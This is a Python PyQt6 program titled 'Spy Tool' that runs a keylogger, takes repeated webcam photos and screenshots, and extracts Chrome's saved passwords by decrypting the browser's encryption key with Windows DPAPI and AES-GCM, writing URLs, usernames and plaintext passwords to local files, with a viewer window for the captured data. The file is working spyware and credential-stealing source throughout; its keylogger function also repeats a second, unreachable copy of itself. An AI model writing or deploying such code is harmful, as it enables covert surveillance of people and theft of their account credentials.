import base64
import json
import os
import shutil
import sqlite3
import sys
import win32crypt
from time import sleep
from Cryptodome.Cipher import AES

import cv2
import pyautogui
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QPixmap

from keylogger import Ui_MainWindow
from PyQt6.QtWidgets import QApplication, QWidget, QMainWindow, QMessageBox, QDialog, QLabel, QVBoxLayout, QPushButton, \
    QTextEdit, QHBoxLayout
from pynput.keyboard import Listener, Key
from datetime import datetime, timedelta


# -----------------------------------------------

def pass_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        return "No Passwords"


# ------------------------------------

app = QApplication(sys.argv)


class one_Window(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Spy Tool - Data Viewer")
        self.setFixedSize(400, 400)
        self.setWindowOpacity(0.95)

        # Create main layout
        self.vbox = QVBoxLayout()

        # Add title label
        title_label = QLabel("Spy Tool - Data Viewer")
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        font = title_label.font()
        font.setPointSize(16)
        font.setBold(True)
        title_label.setFont(font)
        self.vbox.addWidget(title_label)

        # Add description
        desc_label = QLabel("Select a data source to view:")
        desc_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.vbox.addWidget(desc_label)
        self.vbox.addSpacing(10)

        # Create buttons with icons and descriptions
        self.btn_1 = QPushButton("Keylogger Data")
        self.btn_1.setToolTip("View captured keyboard input")
        self.btn_1.setMinimumHeight(50)
        self.btn_1.clicked.connect(self.show_keylogger)

        self.btn_2 = QPushButton("Webcam Captures")
        self.btn_2.setToolTip("View images captured from webcam")
        self.btn_2.setMinimumHeight(50)
        self.btn_2.clicked.connect(self.show_webcam)

        self.btn_3 = QPushButton("Screenshots")
        self.btn_3.setToolTip("View captured screenshots")
        self.btn_3.setMinimumHeight(50)
        self.btn_3.clicked.connect(self.show_screenshot)

        self.btn_4 = QPushButton("Web Passwords")
        self.btn_4.setToolTip("View saved web passwords")
        self.btn_4.setMinimumHeight(50)
        self.btn_4.clicked.connect(self.web_passwd)

        self.btn_5 = QPushButton("Close")
        self.btn_5.setToolTip("Close this window")
        self.btn_5.setMinimumHeight(40)
        self.btn_5.clicked.connect(self.close_window)

        # Add buttons to layout
        self.vbox.addWidget(self.btn_1)
        self.vbox.addWidget(self.btn_2)
        self.vbox.addWidget(self.btn_3)
        self.vbox.addWidget(self.btn_4)
        self.vbox.addSpacing(20)
        self.vbox.addWidget(self.btn_5)

        # Set layout
        self.setLayout(self.vbox)

    def show_keylogger(self):
        # Ensure directory and file exist
        os.makedirs('./key', exist_ok=True)
        if not os.path.exists('./key/key.txt'):
            with open('./key/key.txt', 'w') as f:
                pass

        path = './key/key.txt'
        win = Second_Window(self)
        win.set_key_path(path)
        win.exec()

    def show_webcam(self):
        # Ensure directory exists
        os.makedirs('./webcam', exist_ok=True)

        path = './webcam'
        win = there_Window(self)
        win.load_images(path)
        win.exec()

    def show_screenshot(self):
        # Ensure directory exists
        os.makedirs('./screen_shot', exist_ok=True)

        path = './screen_shot'
        win = there_Window(self)
        win.load_images(path)
        win.exec()

    def web_passwd(self):
        # Ensure directory and file exist
        os.makedirs('./web_passwd', exist_ok=True)
        if not os.path.exists('./web_passwd/passwd.txt'):
            with open('./web_passwd/passwd.txt', 'w') as f:
                pass

        path = './web_passwd/passwd.txt'
        win = Second_Window(self)
        win.set_key_path(path)
        win.exec()

    def close_window(self):
        self.close()

    def keyPressEvent(self, event):
        """Handle keyboard shortcuts"""
        if event.key() == Qt.Key.Key_Escape:
            self.close()
        elif event.key() == Qt.Key.Key_1:
            self.show_keylogger()
        elif event.key() == Qt.Key.Key_2:
            self.show_webcam()
        elif event.key() == Qt.Key.Key_3:
            self.show_screenshot()
        elif event.key() == Qt.Key.Key_4:
            self.web_passwd()
        else:
            super().keyPressEvent(event)


class Second_Window(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Text Viewer")
        self.setFixedSize(600, 600)
        self.path = None

        # Create layout
        self.vbox = QVBoxLayout()

        # Create file info label
        self.file_info = QLabel(self)
        self.file_info.setText('File: Not selected')

        # Create text editor with syntax highlighting
        self.text = QTextEdit(self)
        self.text.setLineWrapMode(QTextEdit.LineWrapMode.NoWrap)  # No line wrapping for better code viewing
        font = self.text.font()
        font.setFamily("Consolas")
        font.setPointSize(10)
        self.text.setFont(font)

        # Create button layout
        button_layout = QHBoxLayout()

        # Create copy button
        self.copy_button = QPushButton("Copy to Clipboard")
        self.copy_button.clicked.connect(self.copy_text)

        # Create refresh button
        self.refresh_button = QPushButton("Refresh")
        self.refresh_button.clicked.connect(self.refresh_content)

        # Create clear button
        self.clear_button = QPushButton("Clear File")
        self.clear_button.clicked.connect(self.clear_file)

        # Add buttons to layout
        button_layout.addWidget(self.copy_button)
        button_layout.addWidget(self.refresh_button)
        button_layout.addWidget(self.clear_button)

        # Add widgets to main layout
        self.vbox.addWidget(self.file_info)
        self.vbox.addWidget(self.text)
        self.vbox.addLayout(button_layout)

        # Set main layout
        self.setLayout(self.vbox)

    def set_key_path(self, path):
        """Set the path to the text file and load its content"""
        self.path = path
        self.refresh_content()

    def refresh_content(self):
        """Refresh the content of the text editor"""
        if not self.path:
            return

        try:
            # Check if file exists, create if not
            if not os.path.exists(self.path):
                # Create directory if it doesn't exist
                os.makedirs(os.path.dirname(self.path), exist_ok=True)
                # Create empty file
                with open(self.path, 'w') as f:
                    pass

            # Read file content
            with open(self.path, 'r') as f:
                content = f.read()
                self.text.setText(content)
                self.text.setReadOnly(True)

            # Update file info
            file_size = os.path.getsize(self.path) / 1024  # KB
            mod_time = datetime.fromtimestamp(os.path.getmtime(self.path))
            self.file_info.setText(
                f"File: {os.path.basename(self.path)} | "
                f"Size: {file_size:.1f} KB | "
                f"Modified: {mod_time.strftime('%Y-%m-%d %H:%M:%S')}"
            )

            # Set window title
            self.setWindowTitle(f"Text Viewer - {os.path.basename(self.path)}")

        except FileNotFoundError:
            self.text.setText("File not found")
            self.file_info.setText(f"File: {os.path.basename(self.path)} | Error: Not found")
        except Exception as e:
            self.text.setText(f"Error: {str(e)}")
            self.file_info.setText(f"File: {os.path.basename(self.path)} | Error: {str(e)}")

    def copy_text(self):
        """Copy text to clipboard"""
        text = self.text.toPlainText()
        if text.strip():  # If text is not empty
            clipboard = QApplication.clipboard()
            clipboard.setText(text)
            QMessageBox.information(self, 'Success', 'Text copied to clipboard!')
        else:
            QMessageBox.warning(self, 'Error', 'No text to copy!')

    def clear_file(self):
        """Clear the content of the file"""
        if not self.path:
            return

        reply = QMessageBox.question(
            self, 'Confirm Clear',
            'Are you sure you want to clear the file content?',
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        )

        if reply == QMessageBox.StandardButton.Yes:
            try:
                with open(self.path, 'w') as f:
                    pass  # Clear file by opening in write mode
                self.refresh_content()
                QMessageBox.information(self, 'Success', 'File content cleared!')
            except Exception as e:
                QMessageBox.warning(self, 'Error', f'Could not clear file: {str(e)}')

    def keyPressEvent(self, event):
        """Handle keyboard shortcuts"""
        if event.key() == Qt.Key.Key_Escape:
            self.close()
        elif event.key() == Qt.Key.Key_F5:
            self.refresh_content()
        elif event.key() == Qt.Key.Key_C and event.modifiers() & Qt.KeyboardModifier.ControlModifier:
            self.copy_text()
        else:
            super().keyPressEvent(event)


class there_Window(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle('Image Viewer')
        self.setWindowOpacity(0.9)
        self.setFixedSize(800, 600)

        # Class variables
        self.image_folder = None
        self.image_files = []
        self.current_index = 0

        # Create widgets
        self.label = QLabel()
        self.label.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.prev_btn = QPushButton('Previous Image')
        self.prev_btn.clicked.connect(self.show_prev_image)

        self.next_btn = QPushButton('Next Image')
        self.next_btn.clicked.connect(self.show_next_image)

        self.refresh_btn = QPushButton('Refresh')
        self.refresh_btn.clicked.connect(self.refresh_images)

        self.image_info = QLabel()
        self.image_info.setAlignment(Qt.AlignmentFlag.AlignCenter)

        # Layout
        btn_layout = QHBoxLayout()
        btn_layout.addWidget(self.prev_btn)
        btn_layout.addWidget(self.refresh_btn)
        btn_layout.addWidget(self.next_btn)

        main_layout = QVBoxLayout()
        main_layout.addWidget(self.label)
        main_layout.addWidget(self.image_info)
        main_layout.addLayout(btn_layout)
        self.setLayout(main_layout)

    def load_images(self, path):
        """Load list of images from specified path"""
        self.image_folder = path
        self.refresh_images()

    def refresh_images(self):
        """Refresh the list of images from the folder"""
        if not self.image_folder:
            return

        if os.path.exists(self.image_folder):
            # Get all image files and sort them by modification time (newest first)
            all_files = [f for f in os.listdir(self.image_folder)
                         if f.lower().endswith(('.png', '.jpg', '.jpeg', '.bmp'))]

            # Sort files by modification time (newest first)
            self.image_files = sorted(
                all_files,
                key=lambda x: os.path.getmtime(os.path.join(self.image_folder, x)),
                reverse=True
            )

            self.current_index = 0  # Reset counter

            if self.image_files:
                self.show_current_image()
            else:
                self.label.setText("No images found in this directory")
                self.image_info.setText("")
        else:
            self.label.setText("Directory does not exist")
            self.image_info.setText("")

    def show_current_image(self):
        """Display current image"""
        if not self.image_files or not self.image_folder:
            return

        try:
            image_path = os.path.join(self.image_folder, self.image_files[self.current_index])
            pixmap = QPixmap(image_path)

            if not pixmap.isNull():
                # Adjust image size while maintaining aspect ratio
                pixmap = pixmap.scaled(
                    self.label.width(), self.label.height(),
                    Qt.AspectRatioMode.KeepAspectRatio,
                    Qt.TransformationMode.SmoothTransformation
                )
                self.label.setPixmap(pixmap)

                # Get file info
                file_size = os.path.getsize(image_path) / 1024  # KB
                mod_time = datetime.fromtimestamp(os.path.getmtime(image_path))

                # Update window title and image info
                self.setWindowTitle(f'Image {self.current_index + 1} of {len(self.image_files)}')
                self.image_info.setText(
                    f"File: {self.image_files[self.current_index]}\n"
                    f"Size: {file_size:.1f} KB | Date: {mod_time.strftime('%Y-%m-%d %H:%M:%S')}"
                )
            else:
                self.label.setText("Error loading image")
                self.image_info.setText("")
        except Exception as e:
            self.label.setText(f"Error: {str(e)}")
            self.image_info.setText("")

    def show_prev_image(self):
        """Show previous image"""
        if self.image_files:
            self.current_index = (self.current_index - 1) % len(self.image_files)
            self.show_current_image()

    def show_next_image(self):
        """Show next image"""
        if self.image_files:
            self.current_index = (self.current_index + 1) % len(self.image_files)
            self.show_current_image()

    def resizeEvent(self, event):
        """Resize image when window size changes"""
        self.show_current_image()
        super().resizeEvent(event)

    def keyPressEvent(self, event):
        """Handle keyboard navigation"""
        key = event.key()
        if key == Qt.Key.Key_Left or key == Qt.Key.Key_Up:
            self.show_prev_image()
        elif key == Qt.Key.Key_Right or key == Qt.Key.Key_Down:
            self.show_next_image()
        elif key == Qt.Key.Key_R:
            self.refresh_images()
        elif key == Qt.Key.Key_Escape:
            self.close()
        else:
            super().keyPressEvent(event)


class MainWindow(QMainWindow, Ui_MainWindow):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.setFixedSize(400, 400)
        self.setGeometry(700, 300, 0, 0)
        self.setWindowTitle("Spy Tool")

        # Set button styles
        button_style = """
            QPushButton {
                background-color: #4a86e8;
                color: white;
                border-radius: 5px;
                padding: 8px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #3a76d8;
            }
            QPushButton:pressed {
                background-color: #2a66c8;
            }
        """

        self.btn_1.setStyleSheet(button_style)
        self.btn_2.setStyleSheet(button_style)
        self.btn_3.setStyleSheet(button_style)

        # Update labels
        self.label_1.setText("Spy Tool")
        self.label_2.setText("1. Click START to begin monitoring")
        self.label_3.setText("2. Click SHOW DATA to view results")

        # Update button text
        self.btn_1.setText("SHOW DATA")
        self.btn_2.setText("START")
        self.btn_3.setText("EXIT")

        # Set tooltips
        self.btn_1.setToolTip("View captured data (keystrokes, screenshots, webcam images)")
        self.btn_2.setToolTip("Start monitoring (keylogger, screenshots, webcam)")
        self.btn_3.setToolTip("Exit the application")

        self.btn_1.clicked.connect(self.show_clicked)
        self.btn_2.clicked.connect(self.strat_clicked)
        self.btn_3.clicked.connect(self.close_clicked)

    # -------------------------------keylogger---------------------------------------------------------
    def strat_clicked(self):
        import threading

        # Create directories if they don't exist
        os.makedirs('./key', exist_ok=True)
        os.makedirs('./webcam', exist_ok=True)
        os.makedirs('./screen_shot', exist_ok=True)
        os.makedirs('./web_passwd', exist_ok=True)

        # Create an empty key file if it doesn't exist
        if not os.path.exists('./key/key.txt'):
            with open('./key/key.txt', 'w') as f:
                pass

        # Start webcam and screenshot in separate threads
        webcam_thread = threading.Thread(target=self.web_cam)
        screenshot_thread = threading.Thread(target=self.screen_shot)
        keylogger_thread = threading.Thread(target=self.start_keylogger)
        passwd_thread = threading.Thread(target=self.web_passwd)

        webcam_thread.daemon = True
        screenshot_thread.daemon = True
        keylogger_thread.daemon = True
        passwd_thread.daemon = True

        webcam_thread.start()
        screenshot_thread.start()
        keylogger_thread.start()
        passwd_thread.start()

        # Show a message to the user
        msg = QMessageBox()
        msg.setWindowTitle('Message')
        msg.setText('Started monitoring!')
        msg.setStandardButtons(QMessageBox.StandardButton.Ok)
        msg.setDetailedText(
            'Keylogger, webcam capture, screenshot capture, and browser password extraction have been started.')
        msg.setIcon(QMessageBox.Icon.Information)
        msg.exec()

    def start_keylogger(self):
        # Define special keys mapping
        special_keys = {
            # Main keys
            "Key.space": "[Space]",
            "Key.enter": "[Enter]",
            "Key.tab": "[Tab]",
            "Key.backspace": "[Backspace]",
            "Key.delete": "[Delete]",
            "Key.esc": "[Esc]",
            "Key.caps_lock": "[CapsLock]",

            # Combination keys
            "Key.shift": "[Shift]",
            "Key.shift_l": "[LShift]",
            "Key.shift_r": "[RShift]",
            "Key.ctrl": "[Ctrl]",
            "Key.ctrl_l": "[LCtrl]",
            "Key.ctrl_r": "[RCtrl]",
            "Key.alt": "[Alt]",
            "Key.alt_l": "[LAlt]",
            "Key.alt_r": "[RAlt]",
            "Key.alt_gr": "[AltGr]",
            "Key.cmd": "[Win]",
            "Key.menu": "[Menu]",

            # Arrow keys
            "Key.up": "[Up]",
            "Key.down": "[Down]",
            "Key.left": "[Left]",
            "Key.right": "[Right]",
            "Key.page_up": "[PageUp]",
            "Key.page_down": "[PageDown]",
            "Key.home": "[Home]",
            "Key.end": "[End]",

            # Function keys
            "Key.f1": "[F1]",
            "Key.f2": "[F2]",
            "Key.f3": "[F3]",
            "Key.f4": "[F4]",
            "Key.f5": "[F5]",
            "Key.f6": "[F6]",
            "Key.f7": "[F7]",
            "Key.f8": "[F8]",
            "Key.f9": "[F9]",
            "Key.f10": "[F10]",
            "Key.f11": "[F11]",
            "Key.f12": "[F12]",

            # Numeric keys
            "Key.num_lock": "[NumLock]",
            "Key.numpad_0": "[Num0]",
            "Key.numpad_1": "[Num1]",
            "Key.numpad_2": "[Num2]",
            "Key.numpad_3": "[Num3]",
            "Key.numpad_4": "[Num4]",
            "Key.numpad_5": "[Num5]",
            "Key.numpad_6": "[Num6]",
            "Key.numpad_7": "[Num7]",
            "Key.numpad_8": "[Num8]",
            "Key.numpad_9": "[Num9]",
            "Key.numpad_add": "[Num+]",
            "Key.numpad_subtract": "[Num-]",
            "Key.numpad_multiply": "[Num*]",
            "Key.numpad_divide": "[Num/]",
            "Key.numpad_decimal": "[Num.]",
            "Key.numpad_enter": "[NumEnter]",

            # Multimedia keys
            "Key.media_play_pause": "[Play/Pause]",
            "Key.media_volume_mute": "[Mute]",
            "Key.media_volume_up": "[Vol+]",
            "Key.media_volume_down": "[Vol-]",
            "Key.media_previous": "[Prev]",
            "Key.media_next": "[Next]",

            # Special keys
            "Key.print_screen": "[PrintScreen]",
            "Key.scroll_lock": "[ScrollLock]",
            "Key.pause": "[Pause]",
            "Key.insert": "[Insert]",
            "<98>": "2",
            "<102>": "6"
        }

        def on_press(key):
            try:
                listen = str(key).replace("'", "")
                if listen in special_keys:
                    listen = special_keys[listen]
                with open("./key/key.txt", "a") as f:
                    f.write(listen)
            except Exception as e:
                print(f"Error in keylogger: {e}")

        def on_release(key):
            if str(key) == 'Key.esc':
                return False

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
        # msg.setWindowTitle('massage')
        # msg.setText('start ... !')
        # msg.setStandardButtons(QMessageBox.StandardButton.Ok)
        # msg.setDetailedText('started ...')
        # msg.setIcon(QMessageBox.Icon.Information)
        # msg.exec()

        special_keys = {
            # کلیدهای اصلی
            "Key.space": "[Space]",
            "Key.enter": "[Enter]",
            "Key.tab": "[Tab]",
            "Key.backspace": "[Backspace]",
            "Key.delete": "[Delete]",
            "Key.esc": "[Esc]",
            "Key.caps_lock": "[CapsLock]",

            # کلیدهای ترکیبی
            "Key.shift": "[Shift]",
            "Key.shift_l": "[LShift]",
            "Key.shift_r": "[RShift]",
            "Key.ctrl": "[Ctrl]",
            "Key.ctrl_l": "[LCtrl]",
            "Key.ctrl_r": "[RCtrl]",
            "Key.alt": "[Alt]",
            "Key.alt_l": "[LAlt]",
            "Key.alt_r": "[RAlt]",
            "Key.alt_gr": "[AltGr]",
            "Key.cmd": "[Win]",
            "Key.menu": "[Menu]",

            # کلیدهای جهتنمایی
            "Key.up": "[Up]",
            "Key.down": "[Down]",
            "Key.left": "[Left]",
            "Key.right": "[Right]",
            "Key.page_up": "[PageUp]",
            "Key.page_down": "[PageDown]",
            "Key.home": "[Home]",
            "Key.end": "[End]",

            # کلیدهای تابعی
            "Key.f1": "[F1]",
            "Key.f2": "[F2]",
            "Key.f3": "[F3]",
            "Key.f4": "[F4]",
            "Key.f5": "[F5]",
            "Key.f6": "[F6]",
            "Key.f7": "[F7]",
            "Key.f8": "[F8]",
            "Key.f9": "[F9]",
            "Key.f10": "[F10]",
            "Key.f11": "[F11]",
            "Key.f12": "[F12]",

            # کلیدهای عددی
            "Key.num_lock": "[NumLock]",
            "Key.numpad_0": "[Num0]",
            "Key.numpad_1": "[Num1]",
            "Key.numpad_2": "[Num2]",
            "Key.numpad_3": "[Num3]",
            "Key.numpad_4": "[Num4]",
            "Key.numpad_5": "[Num5]",
            "Key.numpad_6": "[Num6]",
            "Key.numpad_7": "[Num7]",
            "Key.numpad_8": "[Num8]",
            "Key.numpad_9": "[Num9]",
            "Key.numpad_add": "[Num+]",
            "Key.numpad_subtract": "[Num-]",
            "Key.numpad_multiply": "[Num*]",
            "Key.numpad_divide": "[Num/]",
            "Key.numpad_decimal": "[Num.]",
            "Key.numpad_enter": "[NumEnter]",

            # کلیدهای چندرسانه‌ای
            "Key.media_play_pause": "[Play/Pause]",
            "Key.media_volume_mute": "[Mute]",
            "Key.media_volume_up": "[Vol+]",
            "Key.media_volume_down": "[Vol-]",
            "Key.media_previous": "[Prev]",
            "Key.media_next": "[Next]",

            # کلیدهای خاص
            "Key.print_screen": "[PrintScreen]",
            "Key.scroll_lock": "[ScrollLock]",
            "Key.pause": "[Pause]",
            "Key.insert": "[Insert]",
            "<98>": "2",
            "<102>": "6"
        }

        def on_press(key):
            listen = str(key).replace("'", "")
            if special_keys.get(listen):
                listen = special_keys[listen]
            with open("./key/key.txt", "a") as f:
                f.write(listen)

        # start = datetime.now()
        # end = start + timedelta(seconds=10)
        #
        # def on_release(key):
        #     if datetime.now() >= end:
        #         return False

        def on_release(key):
            if str(key) == 'Key.esc':
                return False

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    # -------------------------------webcam-------------------------------------------------

    def web_cam(self):
        try:
            print("Starting webcam capture...")
            i = 0
            while i < 10:
                try:
                    sleep(2)
                    camera = cv2.VideoCapture(0)
                    if not camera.isOpened():
                        print("Error: Could not open webcam")
                        sleep(5)  # Wait a bit longer before trying again
                        continue

                    ret, frame = camera.read()
                    if ret:
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"./webcam/webcam_{timestamp}_{i}.png"
                        cv2.imwrite(filename, frame)
                        print(f"Saved webcam image: {filename}")
                        i += 1
                    else:
                        print("Error: Could not capture frame from webcam")

                    camera.release()
                    cv2.destroyAllWindows()
                except Exception as e:
                    print(f"Error in webcam capture: {e}")
                    sleep(5)  # Wait a bit longer before trying again
            print("Webcam capture completed")
        except Exception as e:
            print(f"Fatal error in webcam function: {e}")
            # Create a file to indicate error
            with open("./webcam/error_log.txt", "a") as f:
                f.write(f"{datetime.now()}: {str(e)}\n")

    # -------------------------------screenshot---------------------------------------------------------

    def screen_shot(self):
        try:
            print("Starting screenshot capture...")
            path = './screen_shot'  # Target path
            os.makedirs(path, exist_ok=True)  # Create directory if it doesn't exist

            i = 0
            while i < 10:
                try:
                    sleep(3)
                    # Capture screenshot
                    my_screenshot = pyautogui.screenshot()

                    # Save screenshot with timestamp for uniqueness
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    file_path = os.path.join(path, f"screenshot_{timestamp}_{i}.png")

                    # Save the screenshot
                    my_screenshot.save(file_path)
                    print(f"Saved screenshot: {file_path}")
                    i += 1
                except Exception as e:
                    print(f"Error capturing screenshot: {e}")
                    sleep(5)  # Wait a bit longer before trying again
            print("Screenshot capture completed")
        except Exception as e:
            print(f"Fatal error in screenshot function: {e}")
            # Create a file to indicate error
            with open("./screen_shot/error_log.txt", "a") as f:
                f.write(f"{datetime.now()}: {str(e)}\n")

    # -------------------------------web passwd---------------------------------------------------------

    def web_passwd(self):
        try:
            # ایجاد پوشه اگر وجود ندارد
            os.makedirs('./web_passwd', exist_ok=True)

            # به دست آوردن کلید
            file_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Local State"
            with open(file_path, "r", encoding="utf-8") as f:
                jn_data = f.read()
                py_data = json.loads(jn_data)

            encryption_key = base64.b64decode(py_data["os_crypt"]["encrypted_key"])[5:]
            key = win32crypt.CryptUnprotectData(encryption_key)[1]

            # به دست آوردن رمز های ذخیره شدن
            db_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
            file_name = "ch_pass.db"
            shutil.copyfile(db_path, file_name)
            db = sqlite3.connect(file_name)
            cursor = db.cursor()
            cursor.execute(
                "select origin_url, action_url, username_value, password_value from logins order by date_last_used")

            # نوشتن پسوردها در فایل
            with open("./web_passwd/passwd.txt", "w", encoding="utf-8") as pf:
                for row in cursor.fetchall():
                    main_url = row[0]
                    login_url = row[1]
                    user_name = row[2]
                    password = pass_decryption(row[3], key)
                    if user_name or password:
                        pf.write(f"main_url: {main_url}\n")
                        pf.write(f"login_url: {login_url}\n")
                        pf.write(f"user_name: {user_name}\n")
                        pf.write(f"password: {password}\n")
                        pf.write("-" * 40 + "\n")
            cursor.close()
            db.close()
            os.remove(file_name)

            # پیام موفقیت حذف شد تا از هنگ کردن برنامه جلوگیری شود

        except Exception as e:
            # پیام خطا حذف شد تا از هنگ کردن برنامه جلوگیری شود
            error_msg = str(e)

            # ثبت خطا در فایل
            with open("./web_passwd/error_log.txt", "a") as f:
                f.write(f"{datetime.now()}: {error_msg}\n")

    def show_clicked(self):
        win = one_Window(self)
        win.exec()

    def close_clicked(self):
        self.close()


window = MainWindow()
window.show()

sys.exit(app.exec())